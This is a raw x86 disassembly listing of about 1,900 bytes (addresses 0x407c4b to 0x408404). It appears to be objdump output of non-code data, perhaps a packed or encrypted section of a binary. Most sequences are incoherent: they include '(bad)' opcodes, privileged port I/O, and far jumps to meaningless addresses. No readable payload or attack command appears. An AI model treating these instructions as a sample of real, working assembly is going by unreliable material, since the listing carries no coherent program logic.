  407c4b:	jmp    0xf8a0cfb2
  407c50:	test   al,0xb
  407c52:	in     eax,dx
  407c53:	xor    dl,cl
  407c55:	inc    edi
  407c56:	es and dl,al
  407c59:	mov    dh,0x4
  407c5b:	pop    es
  407c5c:	fst    DWORD PTR [eax-0x4f5eecc3]
  407c62:	int    0xc8
  407c64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c65:	test   DWORD PTR [eax-0x63],esp
  407c68:	repnz sub BYTE PTR [ecx+0x76],bh
  407c6c:	or     BYTE PTR [esi],dh
  407c6e:	dec    eax
  407c6f:	nop
  407c70:	adc    ah,BYTE PTR [edx]
  407c72:	jecxz  0x407cc5
  407c74:	nop
  407c75:	cmc    
  407c76:	mul    BYTE PTR [eax+0x3]
  407c79:	adc    bh,0xfa
  407c7c:	mov    ebp,0x76dbb638
  407c81:	mov    ebp,0xdbab473b
  407c86:	adc    BYTE PTR [edi+0x30],cl
  407c89:	xchg   ecx,eax
  407c8a:	dec    edi
  407c8b:	xchg   edi,eax
  407c8c:	int    0x62
  407c8e:	push   ecx
  407c8f:	mov    ecx,0x3710366c
  407c94:	push   ebx
  407c95:	mov    esi,0x5c95e77e
  407c9a:	and    BYTE PTR [edx],ch
  407c9c:	daa    
  407c9d:	and    al,0x92
  407c9f:	fbld   TBYTE PTR [edi]
  407ca1:	mov    bl,0xe0
  407ca3:	cmp    edi,esp
  407ca5:	mov    al,ds:0xda65e7e7
  407caa:	mov    ds:0x81f5ba8d,al
  407caf:	jbe    0x407cad
  407cb1:	adc    al,0xe5
  407cb3:	call   FWORD PTR [eax-0x55abd572]
  407cb9:	test   al,0xf7
  407cbb:	aas    
  407cbc:	popf   
  407cbd:	mov    bh,0x94
  407cbf:	mov    al,ds:0x52a810ab
  407cc4:	out    dx,al
  407cc5:	inc    ebp
  407cc6:	push   ebp
  407cc7:	sbb    ecx,esi
  407cc9:	jecxz  0x407c95
  407ccb:	and    ebp,DWORD PTR [esi]
  407ccd:	pop    ebp
  407cce:	mov    ch,BYTE PTR [edi+0x75]
  407cd1:	scas   eax,DWORD PTR es:[edi]
  407cd2:	lods   eax,DWORD PTR ds:[esi]
  407cd3:	cld    
  407cd4:	mul    DWORD PTR [ebp+0x26fd1fd1]
  407cda:	add    BYTE PTR [ecx-0x4431336a],ch
  407ce0:	dec    ebp
  407ce1:	push   0xfc4a6e10
  407ce6:	nop
  407ce7:	push   esp
  407ce8:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  407cea:	and    al,0xb7
  407cec:	mov    ebp,0x233738d
  407cf1:	mov    bh,0x41
  407cf3:	neg    BYTE PTR [ecx-0x76]
  407cf6:	jecxz  0x407d3c
  407cf8:	lds    edi,FWORD PTR [eax+ebp*2-0x1d]
  407cfc:	mov    ebx,0xaf81a52e
  407d01:	cs lock push ebx
  407d04:	repz mov ds:0xd7a9cc04,al
  407d0a:	shr    BYTE PTR [esi+0x731aecf7],cl
  407d10:	dec    esp
  407d11:	add    al,ch
  407d13:	sbb    ch,BYTE PTR [edx+eax*4+0x1d0f31b8]
  407d1a:	adc    dh,BYTE PTR [esp+eiz*8+0x134e7d8]
  407d21:	not    BYTE PTR [ebp-0x7f]
  407d24:	xchg   edx,eax
  407d25:	and    DWORD PTR [ebp-0x18],ebp
  407d28:	inc    ebx
  407d29:	ds retf 0x712b
  407d2d:	sub    BYTE PTR [ebx+0xcb8ba7e],ch
  407d33:	jns    0x407cc6
  407d35:	dec    ecx
  407d36:	jg     0x407cf3
  407d38:	outs   dx,BYTE PTR ds:[esi]
  407d39:	stos   DWORD PTR es:[edi],eax
  407d3a:	push   ebp
  407d3b:	test   DWORD PTR [ebp+0x31cb7471],ecx
  407d41:	mov    al,0x2
  407d43:	sbb    eax,esp
  407d45:	arpl   WORD PTR [esi],bx
  407d47:	mov    ch,0xe1
  407d49:	or     al,0x73
  407d4b:	aaa    
  407d4c:	rcr    ah,0xfa
  407d4f:	sbb    BYTE PTR [edi-0x77],ah
  407d52:	aas    
  407d53:	jl     0x407d2f
  407d55:	cwde   
  407d56:	inc    ebp
  407d57:	sbb    eax,DWORD PTR [ecx+0x7d6cd9e0]
  407d5d:	imul   DWORD PTR [edi+ebp*1]
  407d60:	jge    0x407d9b
  407d62:	cdq    
  407d63:	xchg   esi,eax
  407d64:	push   ss
  407d65:	je     0x407d1d
  407d67:	jg     0x407dc5
  407d69:	and    eax,DWORD PTR [eax]
  407d6b:	push   edx
  407d6c:	mov    al,ds:0xa8c811d1
  407d71:	int    0xf1
  407d73:	xor    al,bh
  407d75:	add    DWORD PTR [ebp*1+0x3ecfc00c],esi
  407d7c:	sub    BYTE PTR [ecx+eiz*1-0x5c],0xf1
  407d81:	loopne 0x407d4c
  407d83:	ret    
  407d84:	and    cl,cl
  407d86:	sub    eax,DWORD PTR [edx+0x40142d80]
  407d8c:	inc    eax
  407d8d:	orps   xmm4,XMMWORD PTR [eax+0x38]
  407d91:	cmp    ecx,DWORD PTR [edi]
  407d93:	in     al,0x22
  407d95:	jae    0x407d63
  407d97:	cmc    
  407d98:	(bad)  
  407d99:	xchg   ebp,eax
  407d9a:	push   esp
  407d9b:	rol    BYTE PTR [ebx-0x352c15b3],1
  407da1:	shl    DWORD PTR [edx],1
  407da3:	push   ecx
  407da4:	test   eax,0x35754071
  407da9:	cmp    BYTE PTR [ebp+0x3ec08c05],0x8d
  407db0:	lods   al,BYTE PTR ds:[esi]
  407db1:	popa   
  407db2:	cmc    
  407db3:	(bad)  
  407db4:	push   ebp
  407db5:	sub    ebx,edi
  407db7:	stc    
  407db8:	test   esi,eax
  407dba:	shr    DWORD PTR [edi+edi*8-0x62930e8e],1
  407dc1:	sbb    esi,ebx
  407dc3:	sbb    eax,0xb1107900
  407dc8:	mov    esp,0x82a96af8
  407dcd:	xchg   bh,bl
  407dcf:	mov    DWORD PTR [edx-0x2c],ecx
  407dd2:	jno    0x407d90
  407dd4:	(bad)  
  407dd5:	popa   
  407dd6:	sub    al,0x4f
  407dd8:	adc    eax,0xb81a8ee6
  407ddd:	fmul   st,st(0)
  407ddf:	ja     0x407db0
  407de1:	jne    0x407dd5
  407de3:	mov    al,ds:0x152871cc
  407de8:	jo     0x407dc6
  407dea:	add    BYTE PTR [eax+edx*1],bh
  407ded:	mov    ds,WORD PTR [ebx+0x62d14b1b]
  407df3:	adc    al,0xc9
  407df5:	repnz popf 
  407df7:	imul   ecx,DWORD PTR [edx+0x4acd7575],0x38
  407dfe:	div    BYTE PTR [edx+eax*1-0x670a7653]
  407e05:	jae    0x407dd4
  407e07:	dec    esp
  407e08:	pop    ecx
  407e09:	adc    al,0x75
  407e0b:	or     edi,DWORD PTR [ebx+edi*4+0x79]
  407e0f:	cmp    al,0x42
  407e11:	les    esi,FWORD PTR [ebx+ebx*1]
  407e14:	push   ebx
  407e15:	fcomp  QWORD PTR [ebx-0x5d79fcc5]
  407e1b:	int    0x69
  407e1d:	mov    edi,0x7fb38be5
  407e22:	xchg   ecx,eax
  407e23:	int3   
  407e24:	fs int3 
  407e26:	xchg   esp,eax
  407e27:	adc    esi,edx
  407e29:	pop    edx
  407e2a:	in     al,0x33
  407e2c:	push   edi
  407e2d:	scas   al,BYTE PTR es:[edi]
  407e2e:	(bad)  
  407e2f:	mov    al,ds:0x6b890a0f
  407e34:	aam    0x69
  407e36:	jecxz  0x407e37
  407e38:	(bad)  
  407e39:	lds    esp,FWORD PTR [edx+0xce7920]
  407e3f:	and    edi,DWORD PTR [ebx]
  407e41:	mov    al,0x45
  407e43:	xor    al,0x9f
  407e45:	mov    ds:0xa85bb2d5,eax
  407e4a:	ins    BYTE PTR es:[edi],dx
  407e4b:	cmp    DWORD PTR [edx+0x4a9996b9],edi
  407e51:	push   ds
  407e52:	push   es
  407e53:	iret   
  407e54:	enter  0x893,0xc3
  407e58:	call   0x9139:0xd08b9b04
  407e5f:	ficom  DWORD PTR [eax+0x2a59f19e]
  407e65:	dec    ebx
  407e66:	pushf  
  407e67:	pop    ebp
  407e68:	jmp    0xf0d4:0x8f0889bf
  407e6f:	scas   eax,DWORD PTR es:[edi]
  407e70:	jns    0x407eda
  407e72:	ret    
  407e73:	cs pop ebx
  407e75:	pop    esi
  407e76:	dec    eax
  407e77:	and    DWORD PTR [esi-0x6a],edi
  407e7a:	add    esi,ebx
  407e7c:	adc    eax,0xad4b328b
  407e81:	xlat   BYTE PTR ds:[ebx]
  407e82:	pop    edi
  407e83:	push   0x2
  407e85:	fucomip st,st(0)
  407e87:	xor    dl,ah
  407e89:	fisub  DWORD PTR [ebp+0x5c848735]
  407e8f:	xor    DWORD PTR [edx],ebx
  407e91:	lahf   
  407e92:	ja     0x407f0c
  407e94:	std    
  407e95:	scas   al,BYTE PTR es:[edi]
  407e96:	jns    0x407f0c
  407e98:	outs   dx,DWORD PTR ds:[esi]
  407e99:	cmp    bl,BYTE PTR [edx-0x455d1448]
  407e9f:	(bad)  
  407ea0:	fadd   DWORD PTR [esi-0x71]
  407ea3:	loope  0x407e66
  407ea5:	xchg   BYTE PTR [esi],cl
  407ea7:	cmp    eax,edx
  407ea9:	std    
  407eaa:	stos   BYTE PTR es:[edi],al
  407eab:	rol    DWORD PTR [ecx+0x1],1
  407eae:	pop    ss
  407eaf:	in     al,0x63
  407eb1:	shl    DWORD PTR [ecx],1
  407eb3:	cmp    BYTE PTR [ebx+0x3434fa88],bl
  407eb9:	sbb    eax,0xd2c20aa5
  407ebe:	push   edi
  407ebf:	in     al,0xc0
  407ec1:	push   esi
  407ec2:	(bad)  
  407ec3:	enter  0xf253,0x34
  407ec7:	adc    BYTE PTR [ecx-0x4e],bh
  407eca:	jg     0x407eec
  407ecc:	or     DWORD PTR [ecx-0x3c],ecx
  407ecf:	sbb    DWORD PTR [ebx+esi*8-0x16],esi
  407ed3:	fcomp  QWORD PTR [esi-0x5e2ebf77]
  407ed9:	pop    edx
  407eda:	xchg   ecx,eax
  407edb:	inc    ebx
  407edc:	iret   
  407edd:	ds (bad) 
  407edf:	dec    DWORD PTR [edx]
  407ee1:	je     0x407e6e
  407ee3:	fisubr WORD PTR [edi+0x2338766c]
  407ee9:	jns    0x407eb5
  407eeb:	dec    ebx
  407eec:	cmp    dh,bl
  407eee:	aaa    
  407eef:	out    0x7b,eax
  407ef1:	fld    TBYTE PTR [edx+esi*1+0x33313cd1]
  407ef8:	sub    esi,edi
  407efa:	push   cs
  407efb:	imul   edx,DWORD PTR [ebp-0x7fde6c85],0xffffffd5
  407f02:	dec    ecx
  407f03:	jb     0x407f7b
  407f05:	push   eax
  407f06:	lods   al,BYTE PTR ds:[esi]
  407f07:	push   esp
  407f08:	xchg   edi,eax
  407f09:	loopne 0x407f41
  407f0b:	push   ebx
  407f0c:	stos   DWORD PTR es:[edi],eax
  407f0d:	and    BYTE PTR [eax-0x17],0xe4
  407f11:	scas   al,BYTE PTR es:[edi]
  407f12:	pop    ds
  407f13:	mov    edx,0x5a0d02d0
  407f18:	jnp    0x407ef9
  407f1a:	rol    BYTE PTR [ebx-0x20],1
  407f1d:	imul   eax,DWORD PTR [edi-0x3aede3ba],0xffffffda
  407f24:	jb     0x407f79
  407f26:	mov    ds,WORD PTR [edi]
  407f28:	clc    
  407f29:	ret    0x543d
  407f2c:	rol    BYTE PTR [edx+0x4177a90a],0xd1
  407f33:	push   ebx
  407f34:	or     ch,cl
  407f36:	stos   BYTE PTR es:[edi],al
  407f37:	(bad)  
  407f38:	pop    ds
  407f39:	aam    0x3
  407f3b:	iret   
  407f3c:	loope  0x407efc
  407f3e:	in     eax,0xd5
  407f40:	cmp    al,0x9e
  407f42:	int    0x16
  407f44:	inc    esp
  407f45:	aad    0x49
  407f47:	test   al,0x39
  407f49:	mov    cl,0xd2
  407f4b:	shld   DWORD PTR [eax-0x8],ebp,0x45
  407f50:	ja     0x407f1c
  407f52:	not    BYTE PTR [esi+edx*4+0x1f]
  407f56:	add    DWORD PTR [eax+0x4b656829],edi
  407f5c:	add    dh,BYTE PTR [ebp-0x178aa9ec]
  407f62:	and    al,BYTE PTR [ebx-0x63]
  407f65:	jecxz  0x407f2a
  407f67:	adc    dl,ah
  407f69:	jp     0x407f2f
  407f6b:	inc    edx
  407f6c:	mov    eax,ds:0x2b3f0468
  407f71:	lods   al,BYTE PTR ds:[esi]
  407f72:	cmp    dl,BYTE PTR [edi-0x7c12a9c3]
  407f78:	cmp    eax,0xe8eb4ed7
  407f7d:	add    eax,0xe81312f7
  407f82:	mov    ch,BYTE PTR [ebx+0x7d]
  407f85:	repz sbb edi,DWORD PTR [ebx+0x9]
  407f89:	repz mov ebx,0x99056d4c
  407f8f:	jecxz  0x40800e
  407f91:	sub    DWORD PTR [ebx-0x11c1114c],eax
  407f97:	inc    esp
  407f98:	ins    BYTE PTR es:[edi],dx
  407f99:	(bad)  
  407f9a:	mov    al,0x3c
  407f9c:	mov    ebx,0xb5a3ff9d
  407fa1:	(bad)  
  407fa3:	fadd   st(6),st
  407fa5:	dec    esi
  407fa6:	inc    edx
  407fa7:	je     0x407fdb
  407fa9:	sub    eax,0x4a34a8b4
  407fae:	imul   ebp,DWORD PTR [ebp-0x1847ea80],0xffffffe5
  407fb5:	fwait
  407fb6:	cs xchg ebx,eax
  407fb8:	jg     0x408028
  407fba:	sbb    dh,BYTE PTR [eax+0x24]
  407fbd:	call   0x8858:0x4da61235
  407fc4:	repz mov ecx,0xe9594b5c
  407fca:	adc    ebx,esi
  407fcc:	push   ebp
  407fcd:	inc    ebx
  407fce:	les    ecx,FWORD PTR [ebx+ebp*8-0x2adcbba1]
  407fd5:	rcr    DWORD PTR [ebp-0x63],1
  407fd8:	shl    BYTE PTR [ecx+0x37aa02ac],1
  407fde:	imul   ecx,DWORD PTR [eax+edx*1],0x6b193b7e
  407fe5:	pop    esp
  407fe6:	lods   eax,DWORD PTR ds:[si]
  407fe8:	mov    al,0xb4
  407fea:	adc    DWORD PTR [edi+edi*4-0x1e25c085],0xf
  407ff2:	stos   DWORD PTR es:[edi],eax
  407ff3:	xor    ebp,DWORD PTR [esi+0x61ac6ab0]
  407ff9:	(bad)  
  407ffa:	mov    edi,0xaf7331ab
  407fff:	jl     0x407f84
  408001:	pop    ds
  408002:	cld    
  408003:	cli    
  408004:	scas   eax,DWORD PTR es:[edi]
  408005:	xor    eax,0xcd853ba5
  40800a:	xchg   ebp,eax
  40800b:	xchg   ebp,eax
  40800c:	ret    
  40800d:	(bad)  
  40800e:	lock cmc 
  408010:	outs   dx,BYTE PTR ds:[esi]
  408011:	fwait
  408012:	pop    eax
  408013:	jnp    0x407f9c
  408015:	pusha  
  408016:	bts    DWORD PTR [edx-0x64],edi
  40801a:	jp     0x408094
  40801c:	pop    ss
  40801d:	popa   
  40801e:	sub    eax,esp
  408020:	rcr    BYTE PTR [eax+edi*2-0x4bfc6272],1
  408027:	push   ss
  408028:	lahf   
  408029:	ins    BYTE PTR es:[edi],dx
  40802a:	mov    al,ds:0x3affc81
  40802f:	xchg   ebp,eax
  408030:	fiadd  WORD PTR [esp+ebp*2]
  408033:	jae    0x407ff4
  408035:	popa   
  408036:	mov    gs,WORD PTR [edi-0x11c00c4d]
  40803c:	or     DWORD PTR [ebx+eiz*8],ecx
  40803f:	push   ebx
  408040:	sbb    al,0x35
  408042:	jo     0x408013
  408044:	fsub   QWORD PTR [edi+esi*4-0x76d37356]
  40804b:	push   edi
  40804c:	and    eax,0x5237202c
  408051:	hlt    
  408052:	mov    esi,0x89b707e8
  408057:	(bad)  
  408058:	mov    ebx,0x55f207e5
  40805d:	ret    0x8eb1
  408060:	dec    edx
  408061:	arpl   WORD PTR [ebx],bx
  408063:	ins    BYTE PTR es:[edi],dx
  408064:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  408066:	add    edx,ecx
  408068:	pop    eax
  408069:	ds jnp 0x4080db
  40806c:	jne    0x4080b3
  40806e:	outs   dx,DWORD PTR ds:[esi]
  40806f:	mov    ebx,0xd5526666
  408074:	jmp    0x40806e
  408076:	pop    edi
  408077:	sti    
  408078:	stc    
  408079:	lahf   
  40807a:	push   edi
  40807b:	test   ebp,0xd3a2c6c6
  408081:	mov    bl,0xc6
  408083:	or     esi,DWORD PTR [ebx-0x71]
  408086:	push   ss
  408087:	pop    ds
  408088:	or     dh,BYTE PTR [ebx-0x54]
  40808b:	mov    BYTE PTR [ebx],cl
  40808d:	scas   al,BYTE PTR es:[edi]
  40808e:	add    bl,0x5a
  408091:	xchg   BYTE PTR [edx-0x6767b1a9],bh
  408097:	popf   
  408098:	cmp    bh,0xfe
  40809b:	cmp    bh,BYTE PTR [eax+0x57ba44a]
  4080a1:	mov    al,0xee
  4080a3:	pop    esi
  4080a4:	popf   
  4080a5:	cld    
  4080a6:	cmp    eax,0xe89178d3
  4080ab:	dec    ebx
  4080ac:	pop    ebp
  4080ad:	in     al,dx
  4080ae:	xlat   BYTE PTR ds:[ebx]
  4080af:	cmp    BYTE PTR [edi+0x56],0x68
  4080b3:	cmp    dl,BYTE PTR [ebx]
  4080b5:	adc    esi,DWORD PTR [edx]
  4080b7:	leave  
  4080b8:	jne    0x40804c
  4080ba:	push   ebx
  4080bb:	push   esi
  4080bc:	std    
  4080bd:	lods   eax,DWORD PTR ds:[esi]
  4080be:	in     al,dx
  4080bf:	push   edi
  4080c0:	or     BYTE PTR [esi-0x161c9a47],bh
  4080c6:	mov    eax,ds:0xfe0d6689
  4080cb:	call   0x511fa135
  4080d0:	xor    ecx,DWORD PTR [edx]
  4080d2:	add    esi,eax
  4080d4:	and    al,0x15
  4080d6:	loop   0x408145
  4080d8:	cli    
  4080d9:	sbb    DWORD PTR [edx+0x436037f3],esp
  4080df:	inc    ebx
  4080e0:	es iret 
  4080e2:	into   
  4080e3:	mov    ss,ebp
  4080e5:	and    dh,ah
  4080e7:	dec    edi
  4080e8:	repz not DWORD PTR [ebp-0x7bda13aa]
  4080ef:	cli    
  4080f0:	adc    ebp,DWORD PTR [eax+eiz*2]
  4080f3:	dec    ecx
  4080f4:	jge    0x408154
  4080f6:	push   0x5b206446
  4080fb:	pop    ds
  4080fc:	aad    0x83
  4080fe:	xor    bh,dh
  408100:	cmp    BYTE PTR [eax+edx*2-0x761edc2a],dl
  408107:	cwde   
  408108:	mov    dh,0x8c
  40810a:	pop    eax
  40810b:	sub    ch,cl
  40810d:	mov    edi,0xc5f1bc38
  408112:	xor    BYTE PTR [edi],ah
  408114:	xor    bl,BYTE PTR [edx-0x14]
  408117:	pop    es
  408118:	xlat   BYTE PTR ds:[ebx]
  408119:	stos   BYTE PTR es:[edi],al
  40811a:	lahf   
  40811b:	addr16 data16 mov cl,0xc6
  40811f:	sub    al,0x7b
  408121:	cmp    ecx,DWORD PTR [eax]
  408123:	or     esi,DWORD PTR [edx+0x78]
  408126:	jno    0x4080d4
  408128:	jp     0x408175
  40812a:	bound  ecx,QWORD PTR [ebx+esi*2]
  40812d:	dec    ebp
  40812e:	mov    eax,0x65797bb0
  408133:	test   BYTE PTR [ebx+0x50],dh
  408136:	mov    bl,ch
  408138:	inc    ebx
  408139:	bound  esp,QWORD PTR [eax]
  40813b:	cmp    al,0x8d
  40813d:	dec    esp
  40813e:	and    BYTE PTR ds:0x7cbd649d,dh
  408144:	shl    DWORD PTR [edi+esi*2],1
  408147:	jmp    0xedd0:0xe70d6e1f
  40814e:	push   eax
  40814f:	fstp   TBYTE PTR [esi]
  408151:	pop    ecx
  408152:	inc    edi
  408153:	std    
  408154:	dec    esp
  408155:	xor    al,0x78
  408157:	test   DWORD PTR [ebp+0x10516c18],eax
  40815d:	mov    esp,0xaf32dd18
  408162:	or     bl,bh
  408164:	and    ecx,DWORD PTR [ecx+0x61]
  408167:	test   BYTE PTR [esi],al
  408169:	fcomp  QWORD PTR [ecx-0x211591fe]
  40816f:	out    dx,eax
  408170:	adc    esi,ebp
  408172:	add    esi,ebx
  408174:	mov    eax,0xe96234b4
  408179:	dec    ebp
  40817a:	gs repnz xchg esp,eax
  40817d:	xchg   esi,eax
  40817e:	inc    ecx
  40817f:	lea    ebp,[edx-0x20]
  408182:	pop    ebp
  408183:	jmp    0x4081d0
  408185:	int3   
  408186:	mov    ecx,0xe6a1857d
  40818b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40818c:	in     al,dx
  40818d:	rcl    DWORD PTR [ebx],0xf0
  408190:	sahf   
  408191:	pop    edi
  408192:	add    ch,BYTE PTR [esi]
  408194:	add    BYTE PTR [ecx+0x59],bh
  408197:	es jns 0x40819f
  40819a:	add    eax,0x45369966
  40819f:	sub    esp,DWORD PTR [esi+0x64]
  4081a2:	adc    ecx,DWORD PTR [edx+0x38]
  4081a5:	dec    edi
  4081a6:	stos   BYTE PTR es:[edi],al
  4081a7:	js     0x40820c
  4081a9:	mov    al,0x83
  4081ab:	xor    dh,BYTE PTR [eax-0x18]
  4081ae:	push   es
  4081af:	sub    al,BYTE PTR [ebp+eiz*8-0x59b3be30]
  4081b6:	jmp    DWORD PTR [ecx-0x42fa230]
  4081bc:	ror    BYTE PTR [ebx+0x4beb57f4],1
  4081c2:	ins    DWORD PTR es:[edi],dx
  4081c3:	mov    WORD PTR [eax+0x1330f51a],fs
  4081c9:	or     al,BYTE PTR [edi+0x1c]
  4081cc:	dec    ecx
  4081cd:	pusha  
  4081ce:	dec    ecx
  4081cf:	(bad)  
  4081d0:	mov    dl,0xf
  4081d2:	jne    0x408234
  4081d4:	loope  0x40818d
  4081d6:	dec    ecx
  4081d7:	imul   eax,eax,0xffffffb8
  4081da:	xchg   ecx,eax
  4081db:	arpl   WORD PTR [ebp+0x54034453],bx
  4081e1:	out    0x8,al
  4081e3:	loop   0x4081a5
  4081e5:	std    
  4081e6:	sub    ch,ah
  4081e8:	repnz or esp,edi
  4081eb:	lods   al,BYTE PTR ds:[esi]
  4081ec:	(bad)  
  4081ed:	int3   
  4081ee:	fs jbe 0x40820f
  4081f1:	cmp    eax,0x23ce2f43
  4081f6:	adc    BYTE PTR [ebp+0x5d],al
  4081f9:	xlat   BYTE PTR ds:[ebx]
  4081fa:	loop   0x4081ee
  4081fc:	pop    eax
  4081fd:	mov    al,ds:0xbf3ff224
  408202:	pop    edi
  408203:	pop    edi
  408204:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408205:	push   esp
  408206:	push   edi
  408207:	aad    0xd7
  408209:	imul   edx,DWORD PTR [ebx+0x228f2d10],0xffffff95
  408210:	or     al,0xc7
  408212:	ins    BYTE PTR es:[edi],dx
  408213:	dec    ebp
  408214:	jb     0x408232
  408216:	inc    ebx
  408217:	xlat   BYTE PTR ds:[ebx]
  408218:	mov    esp,ss
  40821a:	jae    0x4081ca
  40821c:	dec    esi
  40821d:	and    DWORD PTR [ebx-0x3d],edi
  408220:	mov    edx,0x672e442f
  408225:	scas   eax,DWORD PTR es:[edi]
  408226:	push   edi
  408227:	ret    
  408228:	sub    DWORD PTR [ebx],0x1c
  40822b:	mov    edi,0x21721219
  408230:	je     0x408261
  408232:	jbe    0x408297
  408234:	jno    0x4081d2
  408236:	xchg   DWORD PTR [eax-0x2e],ecx
  408239:	and    al,0x45
  40823b:	pop    ebx
  40823c:	xor    eax,0x282313b7
  408241:	(bad)  
  408242:	nop
  408243:	mov    esp,0x707364fb
  408248:	mov    BYTE PTR [edi-0x5d602e85],bh
  40824e:	mov    edx,0x40a7b0d9
  408253:	pushf  
  408254:	jle    0x4082ad
  408256:	sahf   
  408257:	push   ebx
  408258:	aas    
  408259:	jne    0x40821d
  40825b:	in     al,0x66
  40825d:	jno    0x408218
  40825f:	call   0xd7b0:0x334dd248
  408266:	test   eax,0xf62ae5e9
  40826b:	jp     0x408245
  40826d:	jl     0x408281
  40826f:	test   al,0x6a
  408271:	sub    DWORD PTR [edi+0x6d],edx
  408274:	clc    
  408275:	shl    BYTE PTR [eax+ebp*4+0x34],0xdb
  40827a:	sub    esi,ecx
  40827c:	or     DWORD PTR [esi-0x656b7efa],esp
  408282:	add    DWORD PTR [ebp+0x42649580],esp
  408288:	xor    ah,BYTE PTR es:[esi+0x3ce5febd]
  40828f:	jo     0x408274
  408291:	jp     0x408282
  408293:	dec    ecx
  408294:	popf   
  408295:	(bad)  
  408296:	fdiv   QWORD PTR [eax+0x52]
  408299:	call   0xe6fe013c
  40829e:	(bad)  
  40829f:	(bad)  
  4082a0:	jl     0x40823d
  4082a2:	(bad)  
  4082a3:	iret   
  4082a4:	push   edx
  4082a5:	push   edi
  4082a6:	icebp  
  4082a7:	test   BYTE PTR [esi-0x6f60b968],dh
  4082ad:	mov    eax,0x4eca48dd
  4082b2:	jg     0x408284
  4082b4:	pop    esi
  4082b5:	and    al,BYTE PTR [eax+0x11]
  4082b8:	stos   DWORD PTR es:[edi],eax
  4082b9:	lds    ecx,FWORD PTR [ecx+0x5923bca]
  4082bf:	shr    BYTE PTR [ebp-0x4e546c68],cl
  4082c5:	mov    ebx,0x86679c31
  4082ca:	outs   dx,DWORD PTR ds:[esi]
  4082cb:	rcl    DWORD PTR [ebx-0x13],1
  4082ce:	pop    eax
  4082cf:	adc    al,0x1b
  4082d1:	dec    ebp
  4082d2:	lea    esi,gs:[ebx]
  4082d5:	dec    ebx
  4082d6:	sbb    al,0x7
  4082d8:	xor    cl,BYTE PTR [edx+0x4e]
  4082db:	data16 sbb dl,BYTE PTR [edi]
  4082de:	test   al,0xcc
  4082e0:	(bad)  
  4082e1:	jg     0x40828f
  4082e3:	inc    ebp
  4082e4:	hlt    
  4082e5:	je     0x408313
  4082e7:	(bad)  
  4082e8:	es jge 0x408354
  4082eb:	nop
  4082ec:	ins    BYTE PTR es:[edi],dx
  4082ed:	push   esi
  4082ee:	arpl   cx,ax
  4082f0:	stc    
  4082f1:	test   BYTE PTR [edi+0x41eb6eb2],0xf6
  4082f8:	mov    ecx,0x86c37aac
  4082fd:	dec    ebx
  4082fe:	jg     0x408360
  408300:	in     eax,0xe0
  408302:	cld    
  408303:	mov    ah,0x91
  408305:	push   cs
  408306:	sub    DWORD PTR [ebx-0x5e],ebp
  408309:	jmp    0xb7d7de12
  40830e:	stos   BYTE PTR es:[edi],al
  40830f:	shl    DWORD PTR [edx+0x42a6171d],1
  408315:	add    ebp,DWORD PTR [eax+0x3681b5ab]
  40831b:	lods   eax,DWORD PTR ds:[esi]
  40831c:	xor    eax,0x46bff97c
  408321:	adc    DWORD PTR [ecx+edx*4+0x14],0x1f
  408326:	push   0xfffffffa
  408328:	aas    
  408329:	cs jbe 0x4083aa
  40832c:	sbb    BYTE PTR [eax],bl
  40832e:	mov    esi,0x4f7f5ae4
  408333:	cmp    eax,0xee8eb004
  408338:	das    
  408339:	adc    bl,BYTE PTR [ebx]
  40833b:	jl     0x4082e5
  40833d:	les    esi,FWORD PTR [ebp-0x24]
  408340:	cmp    al,0xb7
  408342:	and    eax,0xa126e42b
  408347:	pop    edx
  408348:	daa    
  408349:	mov    eax,ds:0xf82152f4
  40834e:	je     0x40832a
  408350:	sbb    edx,DWORD PTR [ecx-0x59]
  408353:	jb     0x408363
  408355:	iret   
  408356:	into   
  408357:	sbb    BYTE PTR [eax],dl
  408359:	xchg   ebp,eax
  40835a:	and    BYTE PTR [edx+eiz*1],0x74
  40835e:	push   es
  40835f:	add    BYTE PTR [ecx-0x28],dl
  408362:	sbb    al,0xe6
  408364:	fwait
  408365:	popa   
  408366:	imul   esi,eax,0xffffffce
  408369:	push   ecx
  40836a:	xchg   edi,eax
  40836b:	mov    ds:0xad067245,al
  408370:	pop    esp
  408371:	les    edi,FWORD PTR [ebx+0x52]
  408374:	adc    eax,0xf2a336eb
  408379:	mov    eax,ds:0xb4a220bf
  40837e:	std    
  40837f:	push   ecx
  408380:	mov    WORD PTR [eax+0x2e],?
  408383:	sti    
  408384:	mov    cl,0xb2
  408386:	jecxz  0x4083cc
  408388:	mov    BYTE PTR [ebp-0x6953a140],al
  40838e:	mov    ebp,esi
  408390:	or     al,0xf4
  408392:	jg     0x40831d
  408394:	iret   
  408395:	fbstp  TBYTE PTR [ebx]
  408397:	push   0x45565a63
  40839c:	scas   eax,DWORD PTR es:[edi]
  40839d:	push   edi
  40839e:	mov    ebx,0xf7eba8a5
  4083a3:	inc    ecx
  4083a4:	std    
  4083a5:	or     al,0x7f
  4083a7:	psllq  mm0,QWORD PTR [ebx-0x32]
  4083ab:	pop    ss
  4083ac:	repz imul bx,WORD PTR [ebp-0x34],0xff8c
  4083b2:	cmp    DWORD PTR [edi-0x4fd34d93],esp
  4083b8:	daa    
  4083b9:	or     eax,0xa7cc0922
  4083be:	mov    ch,0x41
  4083c0:	lods   eax,DWORD PTR ds:[esi]
  4083c1:	and    BYTE PTR [esi+0x16],bl
  4083c4:	mov    bl,0x3b
  4083c6:	and    eax,0x61ccc0cc
  4083cb:	stc    
  4083cc:	push   0x9b934bc8
  4083d1:	mov    ss,WORD PTR [eax]
  4083d3:	push   edx
  4083d4:	pop    ecx
  4083d5:	pop    esp
  4083d6:	jae    0x408435
  4083d8:	aas    
  4083d9:	iret   
  4083da:	jo     0x408385
  4083dc:	ret    0xe775
  4083df:	test   BYTE PTR [ecx+0x66],0xce
  4083e3:	(bad)  
  4083e4:	out    dx,eax
  4083e5:	sbb    DWORD PTR [ebx],ecx
  4083e7:	jle    0x408406
  4083e9:	sar    DWORD PTR [esi-0x3e],cl
  4083ec:	shr    BYTE PTR ds:0xa8ced8a6,1
  4083f2:	cmp    ebx,0xae080cd1
  4083f8:	xchg   ebx,eax
  4083f9:	fdiv   st,st(6)
  4083fb:	inc    ax
  4083fd:	dec    esi
  4083fe:	fiadd  DWORD PTR [ebx]
  408400:	xchg   BYTE PTR [esp+esi*4-0x3a],bh
  408404:	cmp    eax,0xd8853ea3
